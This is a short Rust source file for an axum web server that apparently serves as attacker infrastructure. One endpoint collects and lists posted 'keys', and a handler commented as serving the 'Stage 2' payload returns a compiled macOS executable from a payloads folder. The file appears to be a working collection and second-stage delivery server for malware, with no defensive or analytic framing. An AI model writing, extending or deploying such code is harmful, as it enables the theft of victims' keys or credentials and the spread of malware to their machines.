use axum::{
    extract::State,
    http::StatusCode,
    response::Json,
    routing::{get, post},
    Router,
};
use std::sync::Arc;
use crate::storage::Storage;

pub fn create_routes(storage: Storage) -> Router {
    Router::new()
        .route("/keys", post(receive_key))
        .route("/keys", get(get_keys))
        .with_state(Arc::new(storage))
}

pub async fn receive_key(
    State(storage): State<Arc<Storage>>,
    Json(payload): Json<serde_json::Value>,
) -> StatusCode {
    storage.add(payload);
    StatusCode::CREATED
}

pub async fn get_keys(
    State(storage): State<Arc<Storage>>,
) -> Json<Vec<serde_json::Value>> {
    Json(storage.get_all())
}

// SERVIR EL PAYLOAD (Stage 2) - CORREGIDO
pub async fn serve_payload() -> Vec<u8> {
    // Leer el ejecutable compilado de stage2_macos
    std::fs::read("./payloads/stage2_macos").unwrap_or_default()
}
